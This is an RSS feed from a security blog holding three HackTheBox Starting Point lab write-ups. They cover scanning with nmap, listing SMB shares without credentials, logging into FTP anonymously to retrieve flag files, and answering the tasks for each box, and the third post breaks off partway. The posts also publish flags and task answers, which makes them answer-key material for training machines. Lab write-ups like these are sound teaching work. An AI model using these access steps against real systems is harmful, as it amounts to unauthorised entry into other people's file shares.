<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WeaponizedPeach >> Infosec</title><link>https://weaponizedpeach.github.io/</link><description>Recent content on WeaponizedPeach >> Infosec</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 20 Feb 2022 00:11:44 +0200</lastBuildDate><atom:link href="https://weaponizedpeach.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>HackTheBox: Dancing</title><link>https://weaponizedpeach.github.io/p/hackthebox-dancing/</link><pubDate>Sun, 20 Feb 2022 00:11:44 +0200</pubDate><guid>https://weaponizedpeach.github.io/p/hackthebox-dancing/</guid><description>&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-dancing/cover.png" alt="Featured image of post HackTheBox: Dancing" />&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>This is another Very Easy machine from the Starting Point section on HackTheBox. As is typical, besides just getting the root flag, we will need to answer some questions.&lt;/p>
&lt;h2 id="tasks">Tasks&lt;/h2>
&lt;h3 id="task-1-what-does-the-3-letter-acronym-smb-stand-for">Task 1: What does the 3-letter acronym SMB stand for?&lt;/h3>
&lt;pre tabindex="0">&lt;code>Server Message Block
&lt;/code>&lt;/pre>&lt;h3 id="task-2-what-port-does-smb-use-to-operate-at">Task 2: What port does SMB use to operate at?&lt;/h3>
&lt;pre tabindex="0">&lt;code>445
&lt;/code>&lt;/pre>&lt;h3 id="task-3-what-network-communication-model-does-smb-use-architecturally-speaking">Task 3: What network communication model does SMB use, architecturally speaking?&lt;/h3>
&lt;p>Let&amp;rsquo;s Google a bit and find a diagram of the architecture used in SMB:
&lt;figure
class="gallery-image"
style="
flex-grow: 177;
flex-basis: 426px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-dancing/smb_architecture.png" data-size="1920x1080">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-dancing/smb_architecture.png"
width="1920"
height="1080"
srcset="https://weaponizedpeach.github.io/p/hackthebox-dancing/smb_architecture_hud950ceb0d5e36fb263047813196c746f_24302_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-dancing/smb_architecture_hud950ceb0d5e36fb263047813196c746f_24302_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="SMB architecture (Source: ionos.co.uk)">
&lt;/a>
&lt;figcaption>SMB architecture (Source: ionos.co.uk)&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Thus, the answer would be:&lt;/p>
&lt;pre tabindex="0">&lt;code>Client-Server Model
&lt;/code>&lt;/pre>&lt;h3 id="task-4-what-is-the-service-name-for-port-445-that-came-up-in-our-nmap-scan">Task 4: What is the service name for port 445 that came up in our nmap scan?&lt;/h3>
&lt;p>For this question, let&amp;rsquo;s start an nmap scan and see what we have.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">weaponizedpeach@Akatosh:~$ nmap 10.129.1.12
Starting Nmap 7.80 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2022-02-20 00:53 EET
Nmap scan report &lt;span class="k">for&lt;/span> 10.129.1.12
Host is up &lt;span class="o">(&lt;/span>0.044s latency&lt;span class="o">)&lt;/span>.
Not shown: &lt;span class="m">997&lt;/span> closed ports
PORT STATE SERVICE
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 1.86 seconds
weaponizedpeach@Akatosh:~$
&lt;/code>&lt;/pre>&lt;/div>&lt;p>According to the output results, the answer should be:&lt;/p>
&lt;pre tabindex="0">&lt;code>microsoft-ds
&lt;/code>&lt;/pre>&lt;h3 id="task-5-what-is-the-tool-we-use-to-connect-to-smb-shares-from-our-linux-distribution">Task 5: What is the tool we use to connect to SMB shares from our Linux distribution?&lt;/h3>
&lt;p>While there are a few, we most commonly will use:&lt;/p>
&lt;pre tabindex="0">&lt;code>smbclient
&lt;/code>&lt;/pre>&lt;h3 id="task-6-what-is-the-flag-or-switch-we-can-use-with-the-smb-tool-to-list-the-contents-of-the-share">Task 6: What is the &lt;code>flag&lt;/code> or &lt;code>switch&lt;/code> we can use with the SMB tool to &lt;code>list&lt;/code> the contents of the share?&lt;/h3>
&lt;p>Let&amp;rsquo;s pull up the help output of &lt;code>smbclient&lt;/code> to find out:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">weaponizedpeach@Akatosh:~$ smbclient -h
Usage: smbclient &lt;span class="o">[&lt;/span>-?EgqBVNkPeC&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-?&lt;span class="p">|&lt;/span>--help&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--usage&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-R&lt;span class="p">|&lt;/span>--name-resolve&lt;span class="o">=&lt;/span>NAME-RESOLVE-ORDER&lt;span class="o">]&lt;/span>
&lt;span class="o">[&lt;/span>-M&lt;span class="p">|&lt;/span>--message&lt;span class="o">=&lt;/span>HOST&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-I&lt;span class="p">|&lt;/span>--ip-address&lt;span class="o">=&lt;/span>IP&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-E&lt;span class="p">|&lt;/span>--stderr&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-L&lt;span class="p">|&lt;/span>--list&lt;span class="o">=&lt;/span>HOST&lt;span class="o">]&lt;/span>
&lt;span class="o">[&lt;/span>-m&lt;span class="p">|&lt;/span>--max-protocol&lt;span class="o">=&lt;/span>LEVEL&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-T&lt;span class="p">|&lt;/span>--tar&lt;span class="o">=&lt;/span>&amp;lt;c&lt;span class="p">|&lt;/span>x&amp;gt;IXFvgbNan&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-D&lt;span class="p">|&lt;/span>--directory&lt;span class="o">=&lt;/span>DIR&lt;span class="o">]&lt;/span>
&lt;span class="o">[&lt;/span>-c&lt;span class="p">|&lt;/span>--command&lt;span class="o">=&lt;/span>STRING&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-b&lt;span class="p">|&lt;/span>--send-buffer&lt;span class="o">=&lt;/span>BYTES&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-t&lt;span class="p">|&lt;/span>--timeout&lt;span class="o">=&lt;/span>SECONDS&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-p&lt;span class="p">|&lt;/span>--port&lt;span class="o">=&lt;/span>PORT&lt;span class="o">]&lt;/span>
&lt;span class="o">[&lt;/span>-g&lt;span class="p">|&lt;/span>--grepable&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-q&lt;span class="p">|&lt;/span>--quiet&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-B&lt;span class="p">|&lt;/span>--browse&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-d&lt;span class="p">|&lt;/span>--debuglevel&lt;span class="o">=&lt;/span>DEBUGLEVEL&lt;span class="o">]&lt;/span>
&lt;span class="o">[&lt;/span>-s&lt;span class="p">|&lt;/span>--configfile&lt;span class="o">=&lt;/span>CONFIGFILE&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-l&lt;span class="p">|&lt;/span>--log-basename&lt;span class="o">=&lt;/span>LOGFILEBASE&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-V&lt;span class="p">|&lt;/span>--version&lt;span class="o">]&lt;/span>
&lt;span class="o">[&lt;/span>--option&lt;span class="o">=&lt;/span>&lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>value&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-O&lt;span class="p">|&lt;/span>--socket-options&lt;span class="o">=&lt;/span>SOCKETOPTIONS&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-n&lt;span class="p">|&lt;/span>--netbiosname&lt;span class="o">=&lt;/span>NETBIOSNAME&lt;span class="o">]&lt;/span>
&lt;span class="o">[&lt;/span>-W&lt;span class="p">|&lt;/span>--workgroup&lt;span class="o">=&lt;/span>WORKGROUP&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-i&lt;span class="p">|&lt;/span>--scope&lt;span class="o">=&lt;/span>SCOPE&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-U&lt;span class="p">|&lt;/span>--user&lt;span class="o">=&lt;/span>USERNAME&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-N&lt;span class="p">|&lt;/span>--no-pass&lt;span class="o">]&lt;/span>
&lt;span class="o">[&lt;/span>-k&lt;span class="p">|&lt;/span>--kerberos&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-A&lt;span class="p">|&lt;/span>--authentication-file&lt;span class="o">=&lt;/span>FILE&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-S&lt;span class="p">|&lt;/span>--signing&lt;span class="o">=&lt;/span>on&lt;span class="p">|&lt;/span>off&lt;span class="p">|&lt;/span>required&lt;span class="o">]&lt;/span>
&lt;span class="o">[&lt;/span>-P&lt;span class="p">|&lt;/span>--machine-pass&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-e&lt;span class="p">|&lt;/span>--encrypt&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-C&lt;span class="p">|&lt;/span>--use-ccache&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--pw-nt-hash&lt;span class="o">]&lt;/span> service &amp;lt;password&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>[-L|--list=HOST]&lt;/code> seems promising. Let&amp;rsquo;s try it!&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">weaponizedpeach@Akatosh:~$ smbclient -L 10.129.1.12
Enter WORKGROUP&lt;span class="se">\w&lt;/span>eaponizedpeach&lt;span class="err">&amp;#39;&lt;/span>s password:
Sharename Type Comment
--------- ---- -------
ADMIN$ Disk Remote Admin
C$ Disk Default share
IPC$ IPC Remote IPC
WorkShares Disk
SMB1 disabled -- no workgroup available
weaponizedpeach@Akatosh:~$
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Seems like a success. The switch would be:&lt;/p>
&lt;pre tabindex="0">&lt;code>-L
&lt;/code>&lt;/pre>&lt;h3 id="task-7-what-is-the-name-of-the-share-we-are-able-to-access-in-the-end">Task 7: What is the name of the share we are able to access in the end?&lt;/h3>
&lt;p>The SMB share &lt;code>WorkShares&lt;/code> does not exist by default, so it stands out. Let&amp;rsquo;s try it out first.&lt;/p>
&lt;pre tabindex="0">&lt;code>weaponizedpeach@Akatosh:~$ smbclient \\\\10.129.1.12\\WorkShares
Enter WORKGROUP\weaponizedpeach's password:
Try &amp;quot;help&amp;quot; to get a list of possible commands.
smb: \&amp;gt; ls
. D 0 Mon Mar 29 11:22:01 2021
.. D 0 Mon Mar 29 11:22:01 2021
Amy.J D 0 Mon Mar 29 12:08:24 2021
James.P D 0 Thu Jun 3 11:38:03 2021
5114111 blocks of size 4096. 1753477 blocks available
&lt;/code>&lt;/pre>&lt;p>Nice, we have a couple of directories to choose from.&lt;/p>
&lt;h3 id="task-8-what-is-the-command-we-can-use-within-the-smb-shell-to-download-the-files-we-find">Task 8: What is the command we can use within the SMB shell to download the files we find?&lt;/h3>
&lt;p>For this we can pull up the SMB &lt;code>help&lt;/code> menu and check what it has in store:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">Try &lt;span class="s2">&amp;#34;help&amp;#34;&lt;/span> to get a list of possible commands.
smb: &lt;span class="se">\&amp;gt;&lt;/span> &lt;span class="nb">help&lt;/span>
? allinfo altname archive backup
blocksize cancel case_sensitive &lt;span class="nb">cd&lt;/span> chmod
chown close del deltree dir
du &lt;span class="nb">echo&lt;/span> &lt;span class="nb">exit&lt;/span> get getfacl
geteas hardlink &lt;span class="nb">help&lt;/span> &lt;span class="nb">history&lt;/span> iosize
lcd link lock lowercase ls
l mask md mget mkdir
more mput newer notify open
posix posix_encrypt posix_open posix_mkdir posix_rmdir
posix_unlink posix_whoami print prompt put
&lt;span class="nb">pwd&lt;/span> q queue quit readlink
rd recurse reget rename reput
rm rmdir showacls setea setmode
scopy stat symlink tar tarmode
timeout translate unlock volume vuid
wdel logon listconnect showconnect tcon
tdis tid utimes logoff ..
!
smb: &lt;span class="se">\&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s look which command stands out the most that we could use to download files:&lt;/p>
&lt;pre tabindex="0">&lt;code>get
&lt;/code>&lt;/pre>&lt;h3 id="submit-root-flag">Submit root flag&lt;/h3>
&lt;p>Let&amp;rsquo;s continue from where we stopped at the end of Task 7 and check out the directory &lt;code>James. P&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">smb: &lt;span class="se">\&amp;gt;&lt;/span> &lt;span class="nb">cd&lt;/span> James.P
smb: &lt;span class="se">\J&lt;/span>ames.P&lt;span class="se">\&amp;gt;&lt;/span> ls
. D &lt;span class="m">0&lt;/span> Thu Jun &lt;span class="m">3&lt;/span> 11:38:03 &lt;span class="m">2021&lt;/span>
.. D &lt;span class="m">0&lt;/span> Thu Jun &lt;span class="m">3&lt;/span> 11:38:03 &lt;span class="m">2021&lt;/span>
flag.txt A &lt;span class="m">32&lt;/span> Mon Mar &lt;span class="m">29&lt;/span> 12:26:57 &lt;span class="m">2021&lt;/span>
&lt;span class="m">5114111&lt;/span> blocks of size 4096. &lt;span class="m">1753477&lt;/span> blocks available
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Awesome, right there is our flag, let&amp;rsquo;s download it and finish this box :)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">smb: &lt;span class="se">\J&lt;/span>ames.P&lt;span class="se">\&amp;gt;&lt;/span> get flag.txt
getting file &lt;span class="se">\J&lt;/span>ames.P&lt;span class="se">\f&lt;/span>lag.txt of size &lt;span class="m">32&lt;/span> as flag.txt &lt;span class="o">(&lt;/span>0.2 KiloBytes/sec&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>average 0.2 KiloBytes/sec&lt;span class="o">)&lt;/span>
smb: &lt;span class="se">\J&lt;/span>ames.P&lt;span class="se">\&amp;gt;&lt;/span> &lt;span class="nb">exit&lt;/span>
weaponizedpeach@Akatosh:~$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
weaponizedpeach@Akatosh:~$
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Per usual, we need to provide the flag in the format &lt;code>HTB{flag}&lt;/code>. And so, the flag is &lt;code>HTB{5f61c10dffbc77a704d76016a22f1664}&lt;/code>&lt;/p>
&lt;h2 id="outro">Outro&lt;/h2>
&lt;p>Another short and simple box from the Starting Point set of machines. I like that HackTheBox mixes in Windows machines as well, not just Unix/Linux ones. And since SMB is so prevalent amongst Windows boxes, I think it is useful to touch on it as well.&lt;/p></description></item><item><title>HackTheBox: Fawn</title><link>https://weaponizedpeach.github.io/p/hackthebox-fawn/</link><pubDate>Sat, 19 Feb 2022 22:02:29 +0200</pubDate><guid>https://weaponizedpeach.github.io/p/hackthebox-fawn/</guid><description>&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-fawn/cover.png" alt="Featured image of post HackTheBox: Fawn" />&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>This is another Very Easy machine from the Starting Point section on HackTheBox. As is typical, besides just getting the root flag, we will need to answer some questions.&lt;/p>
&lt;h2 id="tasks">Tasks&lt;/h2>
&lt;h3 id="task-1-what-does-the-3-letter-acronym-ftp-stand-for">Task 1: What does the 3-letter acronym FTP stand for?&lt;/h3>
&lt;pre tabindex="0">&lt;code>File Transfer Protocol
&lt;/code>&lt;/pre>&lt;h3 id="task-2-what-communication-model-does-ftp-use-architecturally-speaking">Task 2: What communication model does FTP use, architecturally speaking?&lt;/h3>
&lt;p>Here&amp;rsquo;s what the FTP architecture looks like (at a high level).&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 92;
flex-basis: 221px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-fawn/ftp_architecture.png" data-size="340x369">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-fawn/ftp_architecture.png"
width="340"
height="369"
srcset="https://weaponizedpeach.github.io/p/hackthebox-fawn/ftp_architecture_huaa86487fb995695f35e441cd78a36dc1_13964_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-fawn/ftp_architecture_huaa86487fb995695f35e441cd78a36dc1_13964_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="FTP architecture (Source: educba.com)">
&lt;/a>
&lt;figcaption>FTP architecture (Source: educba.com)&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Thus, our answer would be:&lt;/p>
&lt;pre tabindex="0">&lt;code>Client-Server model
&lt;/code>&lt;/pre>&lt;h3 id="task-3-what-is-the-name-of-one-popular-gui-ftp-program">Task 3: What is the name of one popular GUI FTP program?&lt;/h3>
&lt;pre tabindex="0">&lt;code>Filezilla
&lt;/code>&lt;/pre>&lt;h3 id="task-4-which-port-is-the-ftp-service-active-on-usually">Task 4: Which port is the FTP service active on usually?&lt;/h3>
&lt;pre tabindex="0">&lt;code>21 TCP
&lt;/code>&lt;/pre>&lt;h3 id="task-5-what-acronym-is-used-for-the-secure-version-of-ftp">Task 5: What acronym is used for the secure version of FTP?&lt;/h3>
&lt;p>&lt;code>Secure File Transfer Protocol&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>SFTP
&lt;/code>&lt;/pre>&lt;h3 id="task-6-what-is-the-command-we-can-use-to-test-our-connection-to-the-target">Task 6: What is the command we can use to test our connection to the target?&lt;/h3>
&lt;pre tabindex="0">&lt;code>ping
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s test out the connection:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">weaponizedpeach@Akatosh:~$ ping 10.129.226.127
PING 10.129.226.127 &lt;span class="o">(&lt;/span>10.129.226.127&lt;span class="o">)&lt;/span> 56&lt;span class="o">(&lt;/span>84&lt;span class="o">)&lt;/span> bytes of data.
&lt;span class="m">64&lt;/span> bytes from 10.129.226.127: &lt;span class="nv">icmp_seq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="nv">ttl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">63&lt;/span> &lt;span class="nv">time&lt;/span>&lt;span class="o">=&lt;/span>48.9 ms
&lt;span class="m">64&lt;/span> bytes from 10.129.226.127: &lt;span class="nv">icmp_seq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">2&lt;/span> &lt;span class="nv">ttl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">63&lt;/span> &lt;span class="nv">time&lt;/span>&lt;span class="o">=&lt;/span>48.7 ms
&lt;span class="m">64&lt;/span> bytes from 10.129.226.127: &lt;span class="nv">icmp_seq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">3&lt;/span> &lt;span class="nv">ttl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">63&lt;/span> &lt;span class="nv">time&lt;/span>&lt;span class="o">=&lt;/span>48.6 ms
^C
--- 10.129.226.127 ping statistics ---
&lt;span class="m">3&lt;/span> packets transmitted, &lt;span class="m">3&lt;/span> received, 0% packet loss, &lt;span class="nb">time&lt;/span> 2004ms
rtt min/avg/max/mdev &lt;span class="o">=&lt;/span> 48.627/48.742/48.871/0.100 ms
weaponizedpeach@Akatosh:~$
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="task-7-from-your-scans-what-version-is-ftp-running-on-the-target">Task 7: From your scans, what version is FTP running on the target?&lt;/h3>
&lt;p>Let&amp;rsquo;s run an nmap scan:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">weaponizedpeach@Akatosh:~$ nmap 10.129.226.127
Starting Nmap 7.80 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2022-02-19 22:27 EET
Nmap scan report &lt;span class="k">for&lt;/span> 10.129.226.127
Host is up &lt;span class="o">(&lt;/span>0.048s latency&lt;span class="o">)&lt;/span>.
Not shown: &lt;span class="m">999&lt;/span> closed ports
PORT STATE SERVICE
21/tcp open ftp
Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 1.91 seconds
weaponizedpeach@Akatosh:~$
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we can see an open FTP port on 21 TCP. However, this is not enough, we also need to get the specific version of FTP used. Let&amp;rsquo;s run nmap again, this time with service and version detection (&lt;code>-sV&lt;/code>) enabled.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">weaponizedpeach@Akatosh:~$ nmap -sV 10.129.226.127
Starting Nmap 7.80 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2022-02-19 22:31 EET
Nmap scan report &lt;span class="k">for&lt;/span> 10.129.226.127
Host is up &lt;span class="o">(&lt;/span>0.049s latency&lt;span class="o">)&lt;/span>.
Not shown: &lt;span class="m">999&lt;/span> closed ports
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
Service Info: OS: Unix
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 2.55 seconds
weaponizedpeach@Akatosh:~$
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This time we got some additional information. Thus, the answer is:&lt;/p>
&lt;pre tabindex="0">&lt;code>vsftpd 3.0.3
&lt;/code>&lt;/pre>&lt;h3 id="task-8-from-your-scans-what-os-type-is-running-on-the-target">Task 8: From your scans, what OS type is running on the target?&lt;/h3>
&lt;p>We can use the nmap output from the previous task to identify the answer to this one as well.&lt;/p>
&lt;pre tabindex="0">&lt;code>Unix
&lt;/code>&lt;/pre>&lt;h3 id="submit-root-flag">Submit root flag&lt;/h3>
&lt;p>Given the fact that the box is oriented towards FTP and there is only a single open port - an FTP service, let&amp;rsquo;s try to connect to it and see what happens.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">weaponizedpeach@Akatosh:~$ ftp 10.129.226.127
Connected to 10.129.226.127.
&lt;span class="m">220&lt;/span> &lt;span class="o">(&lt;/span>vsFTPd 3.0.3&lt;span class="o">)&lt;/span>
Name &lt;span class="o">(&lt;/span>10.129.226.127:weaponizedpeach&lt;span class="o">)&lt;/span>:
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We are being asked for a username. Some FTP servers allow anonymous access, maybe this is one of them, let&amp;rsquo;s give it a try, if so, the password is likely blank:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">Name &lt;span class="o">(&lt;/span>10.129.226.127:weaponizedpeach&lt;span class="o">)&lt;/span>: anonymous
&lt;span class="m">331&lt;/span> Please specify the password.
Password:
&lt;span class="m">230&lt;/span> Login successful.
Remote system &lt;span class="nb">type&lt;/span> is UNIX.
Using binary mode to transfer files.
ftp&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We&amp;rsquo;re in. Let&amp;rsquo;s snoop around and try to snag the flag.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">ftp&amp;gt; ls
&lt;span class="m">200&lt;/span> PORT &lt;span class="nb">command&lt;/span> successful. Consider using PASV.
&lt;span class="m">150&lt;/span> Here comes the directory listing.
-rw-r--r-- &lt;span class="m">1&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">32&lt;/span> Jun &lt;span class="m">04&lt;/span> &lt;span class="m">2021&lt;/span> flag.txt
&lt;span class="m">226&lt;/span> Directory send OK.
ftp&amp;gt; get flag.txt
local: flag.txt remote: flag.txt
&lt;span class="m">200&lt;/span> PORT &lt;span class="nb">command&lt;/span> successful. Consider using PASV.
&lt;span class="m">150&lt;/span> Opening BINARY mode data connection &lt;span class="k">for&lt;/span> flag.txt &lt;span class="o">(&lt;/span>&lt;span class="m">32&lt;/span> bytes&lt;span class="o">)&lt;/span>.
&lt;span class="m">226&lt;/span> Transfer complete.
&lt;span class="m">32&lt;/span> bytes received in 0.00 secs &lt;span class="o">(&lt;/span>34.7996 kB/s&lt;span class="o">)&lt;/span>
ftp&amp;gt; &lt;span class="nb">exit&lt;/span>
&lt;span class="m">221&lt;/span> Goodbye.
weaponizedpeach@Akatosh:~$ ls
OpenVPN flag.txt
weaponizedpeach@Akatosh:~$ cat flag.txt
035db21c881520061c53e0536e44f815
weaponizedpeach@Akatosh:~$
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As usual, we need to provide the flag itself in the format of HTB{_flag_}:&lt;/p>
&lt;pre tabindex="0">&lt;code>HTB{035db21c881520061c53e0536e44f815}
&lt;/code>&lt;/pre>&lt;p>And that&amp;rsquo;s it for Fawn!&lt;/p></description></item><item><title>HackTheBox: Meow</title><link>https://weaponizedpeach.github.io/p/hackthebox-meow/</link><pubDate>Fri, 18 Feb 2022 20:38:56 +0200</pubDate><guid>https://weaponizedpeach.github.io/p/hackthebox-meow/</guid><description>&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-meow/cover.png" alt="Featured image of post HackTheBox: Meow" />&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>This is a Very Easy machine from the Starting Point section on HackTheBox. It is meant to be an introductory box, to fully clear it, in addition to getting flags, we will also need to answer some questions.&lt;/p>
&lt;h2 id="tasks">Tasks&lt;/h2>
&lt;h3 id="task-1-what-does-the-acronym-vm-stand-for">Task 1: What does the acronym &lt;code>VM&lt;/code> stand for?&lt;/h3>
&lt;pre tabindex="0">&lt;code>Virtual Machine
&lt;/code>&lt;/pre>&lt;h3 id="task-2-what-tool-do-we-use-to-interact-with-the-operating-system-in-order-to-start-our-vpn-connection">Task 2: What tool do we use to interact with the operating system in order to start our VPN connection?&lt;/h3>
&lt;pre tabindex="0">&lt;code>Terminal
&lt;/code>&lt;/pre>&lt;h3 id="task-3-what-service-do-we-use-to-form-our-vpn-connection">Task 3: What service do we use to form our VPN connection?&lt;/h3>
&lt;pre tabindex="0">&lt;code>OpenVPN
&lt;/code>&lt;/pre>&lt;h3 id="task-4-what-is-the-abreviated-name-for-a-tunnel-interface-in-the-output-of-your-vpn-boot-up-sequence-output">Task 4: What is the abreviated name for a tunnel interface in the output of your VPN boot-up sequence output?&lt;/h3>
&lt;p>For this, we should start our VPN connection: &lt;code>sudo openvpn our_openvpn_file_here.ovpn&lt;/code>.&lt;/p>
&lt;p>We get a lot of output, but the relevant part for us is this part:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">Fri Feb &lt;span class="m">18&lt;/span> 21:38:17 &lt;span class="m">2022&lt;/span> TUN/TAP device tun0 opened
Fri Feb &lt;span class="m">18&lt;/span> 21:38:17 &lt;span class="m">2022&lt;/span> TUN/TAP TX queue length &lt;span class="nb">set&lt;/span> to &lt;span class="m">100&lt;/span>
Fri Feb &lt;span class="m">18&lt;/span> 21:38:17 &lt;span class="m">2022&lt;/span> /sbin/ip link &lt;span class="nb">set&lt;/span> dev tun0 up mtu &lt;span class="m">1500&lt;/span>
Fri Feb &lt;span class="m">18&lt;/span> 21:38:17 &lt;span class="m">2022&lt;/span> /sbin/ip addr add dev tun0 10.10.15.16/23 broadcast 10.10.15.255
Fri Feb &lt;span class="m">18&lt;/span> 21:38:17 &lt;span class="m">2022&lt;/span> /sbin/ip -6 addr add dead:beef:2::110e/64 dev tun0
Fri Feb &lt;span class="m">18&lt;/span> 21:38:17 &lt;span class="m">2022&lt;/span> /sbin/ip route add 10.10.10.0/23 via 10.10.14.1
Fri Feb &lt;span class="m">18&lt;/span> 21:38:17 &lt;span class="m">2022&lt;/span> /sbin/ip route add 10.129.0.0/16 via 10.10.14.1
Fri Feb &lt;span class="m">18&lt;/span> 21:38:17 &lt;span class="m">2022&lt;/span> add_route_ipv6&lt;span class="o">(&lt;/span>dead:beef::/64 -&amp;gt; dead:beef:2::1 metric -1&lt;span class="o">)&lt;/span> dev tun0
Fri Feb &lt;span class="m">18&lt;/span> 21:38:17 &lt;span class="m">2022&lt;/span> /sbin/ip -6 route add dead:beef::/64 dev tun0
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we can identify the tunnel interface/device as tun0. However, we need the &amp;lsquo;abreviated name for a tunnel interface&amp;rsquo;, not our specific one.&lt;/p>
&lt;p>Thus, the answer is simply:&lt;/p>
&lt;pre tabindex="0">&lt;code>tun
